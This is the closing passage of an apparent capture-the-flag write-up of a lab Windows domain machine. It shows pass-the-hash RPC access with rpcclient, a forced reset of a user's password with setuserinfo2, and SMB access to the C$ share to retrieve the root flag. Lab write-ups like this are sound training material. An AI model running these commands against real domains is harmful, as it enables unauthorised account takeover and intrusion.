<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>rpcclient <span style="color:#f92672">-</span>U <span style="color:#e6db74">'BIR-ADFS-GMSA$'</span> <span style="color:#f92672">--</span>pw<span style="color:#f92672">-</span>nt<span style="color:#f92672">-</span>hash <span style="color:#e6db74">//</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">11</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span>
</span></span></code></pre></div><p>In the password field we will use NTLM hash. and we are able to get RPC access. Now our goal is to change the user’s password so we can login through SMB.
After some research we are able to get a well defined article. <a href="https://malicious.link/post/2017/reset-ad-user-password-with-linux/">RPC User Password Change</a>
The command is very simple, <code>setuserinfo2 USERNAME LEVEL NEW_PASSWORD</code>. For this machine our command will look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>setuserinfo2 <span style="color:#66d9ef">TRISTAN</span><span style="color:#f92672">.</span>DAVIES <span style="color:#ae81ff">23</span> pwn123!
</span></span></code></pre></div><h3 id="using-smb-to-get-access">Using SMB To Get Access</h3>
<p><img alt="" src="/search/20211223154506.png"/></p>
<p>Executing the command we don’t see any errors, that means we successfully executed the command. Now we can connect over SMB with the credentials.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e"># Connecting to SMB with the creds.</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>) smbclient \\\\<span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">11</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span>\\C<span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#f92672">-</span>U <span style="color:#66d9ef">TRISTAN</span><span style="color:#f92672">.</span>DAVIES
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>) cd <span style="color:#66d9ef">Users</span>\<span style="color:#66d9ef">Administrator</span>\<span style="color:#66d9ef">Desktop</span>\
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span>) get root<span style="color:#f92672">.</span>txt
</span></span></code></pre></div>
</div>
<div class="post-footer">
</div>
</article>
</main>
</body>
</html>
